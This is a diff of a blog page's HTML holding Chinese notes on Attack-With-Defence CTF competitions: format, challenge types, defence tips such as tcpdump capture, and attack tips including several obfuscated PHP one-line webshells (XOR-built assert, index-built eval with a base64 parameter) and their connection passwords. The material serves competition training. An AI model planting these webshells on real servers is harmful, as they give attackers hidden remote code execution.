@@ -6,22 +6,19 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
-    <meta name="description" content="###0x01 AWD模式
-Attack With Defence，简而言之就是你既是一个hacker，又是一个manager。比赛形式：一般就是一个ssh对应一个web服务，然后flag五分钟一轮，各队一般都有自己的初始分数，flag被拿会被拿走flag的队伍均分，主办方会对每个队伍的服务进行check，check不过就扣分，扣除的分值由服务check正常的队伍均分。
-###0x02 出题思路">
+    <meta name="description" content="0x01 AWD模式Attack With Defence，简而言之就是你既是一个hacker，又是一个manager。比赛形式：一般就是一个ssh对应一个web服务，然后flag五分钟一轮，各队一般都有自己的初始分数，flag被拿会被拿走flag的队伍均分，主办方会对每个队伍的服务进行check，check不过就扣分，扣除的分值由服务check正常的队伍均分。
+0x02 出题思路1:题目类型">
 <meta property="og:type" content="article">
 <meta property="og:title" content="CTF AWD模式攻防Note">
 <meta property="og:url" content="http://zer0yu.github.io/2018/05/24/ctf-awd-note/index.html">
 <meta property="og:site_name" content="Z3R0YU">
-<meta property="og:description" content="###0x01 AWD模式
-Attack With Defence，简而言之就是你既是一个hacker，又是一个manager。比赛形式：一般就是一个ssh对应一个web服务，然后flag五分钟一轮，各队一般都有自己的初始分数，flag被拿会被拿走flag的队伍均分，主办方会对每个队伍的服务进行check，check不过就扣分，扣除的分值由服务check正常的队伍均分。
-###0x02 出题思路">
-<meta property="og:updated_time" content="2018-05-26T02:30:19.935Z">
+<meta property="og:description" content="0x01 AWD模式Attack With Defence，简而言之就是你既是一个hacker，又是一个manager。比赛形式：一般就是一个ssh对应一个web服务，然后flag五分钟一轮，各队一般都有自己的初始分数，flag被拿会被拿走flag的队伍均分，主办方会对每个队伍的服务进行check，check不过就扣分，扣除的分值由服务check正常的队伍均分。
+0x02 出题思路1:题目类型">
+<meta property="og:updated_time" content="2018-12-13T15:01:28.715Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="CTF AWD模式攻防Note">
-<meta name="twitter:description" content="###0x01 AWD模式
-Attack With Defence，简而言之就是你既是一个hacker，又是一个manager。比赛形式：一般就是一个ssh对应一个web服务，然后flag五分钟一轮，各队一般都有自己的初始分数，flag被拿会被拿走flag的队伍均分，主办方会对每个队伍的服务进行check，check不过就扣分，扣除的分值由服务check正常的队伍均分。
-###0x02 出题思路">
+<meta name="twitter:description" content="0x01 AWD模式Attack With Defence，简而言之就是你既是一个hacker，又是一个manager。比赛形式：一般就是一个ssh对应一个web服务，然后flag五分钟一轮，各队一般都有自己的初始分数，flag被拿会被拿走flag的队伍均分，主办方会对每个队伍的服务进行check，check不过就扣分，扣除的分值由服务check正常的队伍均分。
+0x02 出题思路1:题目类型">
     
     
         
@@ -108,7 +105,7 @@ Attack With Defence，简而言之就是你既是一个hacker，又是一个mana
 
     </div>
     <div id="toc">
-      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-攻击技巧"><span class="toc-number">1.</span> <span class="toc-text">0x04 攻击技巧</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x05-参考"><span class="toc-number">2.</span> <span class="toc-text">0x05 参考</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-AWD模式"><span class="toc-number">1.</span> <span class="toc-text">0x01 AWD模式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-出题思路"><span class="toc-number">2.</span> <span class="toc-text">0x02 出题思路</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-题目类型"><span class="toc-number">2.1.</span> <span class="toc-text">1:题目类型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-代码类型"><span class="toc-number">2.2.</span> <span class="toc-text">2:代码类型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-题目漏洞类型"><span class="toc-number">2.3.</span> <span class="toc-text">3:题目漏洞类型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-出题人思路"><span class="toc-number">2.4.</span> <span class="toc-text">4:出题人思路</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-拿flag方式"><span class="toc-number">2.5.</span> <span class="toc-text">5:拿flag方式</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-防御技巧"><span class="toc-number">3.</span> <span class="toc-text">0x03 防御技巧</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-攻击技巧"><span class="toc-number">4.</span> <span class="toc-text">0x04 攻击技巧</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x05-参考"><span class="toc-number">5.</span> <span class="toc-text">0x05 参考</span></a></li></ol>
     </div>
   </span>
 </div>
@@ -142,27 +139,19 @@ Attack With Defence，简而言之就是你既是一个hacker，又是一个mana
   
 
   <div class="content" itemprop="articleBody">
-    <p>###0x01 AWD模式</p>
-<p>Attack With Defence，简而言之就是你既是一个hacker，又是一个manager。<br>比赛形式：一般就是一个ssh对应一个web服务，然后flag五分钟一轮，各队一般都有自己的初始分数，flag被拿会被拿走flag的队伍均分，主办方会对每个队伍的服务进行check，check不过就扣分，扣除的分值由服务check正常的队伍均分。</p>
-<p>###0x02 出题思路</p>
-<p>####1:题目类型</p>
-<p>  1-出题人自己写的cms，为了恶心然后加个so。</p>
+    <h3 id="0x01-AWD模式"><a href="#0x01-AWD模式" class="headerlink" title="0x01 AWD模式"></a>0x01 AWD模式</h3><p>Attack With Defence，简而言之就是你既是一个hacker，又是一个manager。<br>比赛形式：一般就是一个ssh对应一个web服务，然后flag五分钟一轮，各队一般都有自己的初始分数，flag被拿会被拿走flag的队伍均分，主办方会对每个队伍的服务进行check，check不过就扣分，扣除的分值由服务check正常的队伍均分。</p>
+<h3 id="0x02-出题思路"><a href="#0x02-出题思路" class="headerlink" title="0x02 出题思路"></a>0x02 出题思路</h3><h4 id="1-题目类型"><a href="#1-题目类型" class="headerlink" title="1:题目类型"></a>1:题目类型</h4><p>  1-出题人自己写的cms，为了恶心然后加个so。</p>
 <p>  2-常见或者不常见的cms。</p>
 <p>  3-一些框架漏洞，比如ph师傅挖的CI这种</p>
-<p>####2:代码类型</p>
-<p>目前来说，国内比赛依旧是php居多，当然也会有一些别的，比如py，lua这种。</p>
-<p>####3:题目漏洞类型</p>
-<p>  1-sqli居多</p>
+<h4 id="2-代码类型"><a href="#2-代码类型" class="headerlink" title="2:代码类型"></a>2:代码类型</h4><p>目前来说，国内比赛依旧是php居多，当然也会有一些别的，比如py，lua这种。</p>
+<h4 id="3-题目漏洞类型"><a href="#3-题目漏洞类型" class="headerlink" title="3:题目漏洞类型"></a>3:题目漏洞类型</h4><p>  1-sqli居多</p>
 <p>  2-文件包含</p>
 <p>  3-各种rce</p>
 <p>  4-文件上传</p>
-<p>####4:出题人思路</p>
-<p>为了不让你们这群赛棍把题秒了，我直接放个未公开cms的0day把，算了，要不我自己加点东西。诶，等等，这样是不是有点难了，再放几个比较简单的洞把，直接在index.php或者web根目录下放个shell?</p>
-<p>####5:拿flag方式</p>
-<p>1-是向内网一台机器发送http请求，返回请求中包含flag。</p>
+<h4 id="4-出题人思路"><a href="#4-出题人思路" class="headerlink" title="4:出题人思路"></a>4:出题人思路</h4><p>为了不让你们这群赛棍把题秒了，我直接放个未公开cms的0day把，算了，要不我自己加点东西。诶，等等，这样是不是有点难了，再放几个比较简单的洞把，直接在index.php或者web根目录下放个shell?</p>
+<h4 id="5-拿flag方式"><a href="#5-拿flag方式" class="headerlink" title="5:拿flag方式"></a>5:拿flag方式</h4><p>1-是向内网一台机器发送http请求，返回请求中包含flag。</p>
 <p>2-是例如/home目录下放置flag文件。</p>
-<p>###0x03 防御技巧</p>
-<p>1.分析流量</p>
+<h3 id="0x03-防御技巧"><a href="#0x03-防御技巧" class="headerlink" title="0x03 防御技巧"></a>0x03 防御技巧</h3><p>1.分析流量</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#在比赛服务器上抓取流量包</span></div><div class="line">sudo tcpdump <span class="_">-s</span> 0 -w flow.pcap port 80</div></pre></td></tr></table></figure>
 <p>使用scp写个脚本实时将流量包拷贝到本地用wireshark进行分析</p>
 <p>2.分析日志</p>
@@ -215,7 +204,7 @@ Attack With Defence，简而言之就是你既是一个hacker，又是一个mana
 <figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> ($_=@$_GET[<span class="number">2</span>]).@$_($_POST[<span class="number">1</span>])<span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
 <p>连接方式：php?2=assert密码是1。<br>献上我常用得一句话</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$a=chr(<span class="number">96</span>^<span class="number">5</span>);</div><div class="line">$b=chr(<span class="number">57</span>^<span class="number">79</span>);</div><div class="line">$c=chr(<span class="number">15</span>^<span class="number">110</span>);</div><div class="line">$d=chr(<span class="number">58</span>^<span class="number">86</span>);</div><div class="line">$e=<span class="string">'($_REQUEST[C])'</span>;</div><div class="line">@assert($a.$b.$c.$d.$e);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
-<p>配置为<code>?b=))99(rhC(tseuqeR+lave</code></p>
+<p>使用为<code>?C=phpinfo();</code></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    $sF=<span class="string">"PCT4BA6ODSE_"</span>;$s21=strtolower($sF[<span class="number">4</span>].$sF[<span class="number">5</span>].$sF[<span class="number">9</span>].$sF[<span class="number">10</span>].$sF[<span class="number">6</span>].$sF[<span class="number">3</span>].$sF[<span class="number">11</span>].$sF[<span class="number">8</span>].$sF[<span class="number">10</span>].$sF[<span class="number">1</span>].$sF[<span class="number">7</span>].$sF[<span class="number">8</span>].$sF[<span class="number">10</span>]);$s22=$&#123;strtoupper($sF[<span class="number">11</span>].$sF[<span class="number">0</span>].$sF[<span class="number">7</span>].$sF[<span class="number">9</span>].$sF[<span class="number">2</span>])&#125;[<span class="string">'n985de9'</span>];<span class="keyword">if</span>(<span class="keyword">isset</span>($s22))&#123;<span class="keyword">eval</span>($s21($s22));&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
 <p>配置填<code>n985de9=QGV2YWwoJF9QT1NUWzBdKTs=</code><br>连接密码:0（零）</p>
 <p>5.权限维持</p>
@@ -290,7 +279,7 @@ Attack With Defence，简而言之就是你既是一个hacker，又是一个mana
     </div>
 
     <div id="toc-footer" style="display: none">
-      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-攻击技巧"><span class="toc-number">1.</span> <span class="toc-text">0x04 攻击技巧</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x05-参考"><span class="toc-number">2.</span> <span class="toc-text">0x05 参考</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-AWD模式"><span class="toc-number">1.</span> <span class="toc-text">0x01 AWD模式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-出题思路"><span class="toc-number">2.</span> <span class="toc-text">0x02 出题思路</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-题目类型"><span class="toc-number">2.1.</span> <span class="toc-text">1:题目类型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-代码类型"><span class="toc-number">2.2.</span> <span class="toc-text">2:代码类型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-题目漏洞类型"><span class="toc-number">2.3.</span> <span class="toc-text">3:题目漏洞类型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-出题人思路"><span class="toc-number">2.4.</span> <span class="toc-text">4:出题人思路</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-拿flag方式"><span class="toc-number">2.5.</span> <span class="toc-text">5:拿flag方式</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-防御技巧"><span class="toc-number">3.</span> <span class="toc-text">0x03 防御技巧</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-攻击技巧"><span class="toc-number">4.</span> <span class="toc-text">0x04 攻击技巧</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x05-参考"><span class="toc-number">5.</span> <span class="toc-text">0x05 参考</span></a></li></ol>
     </div>
 
     <div id="share-footer" style="display: none">
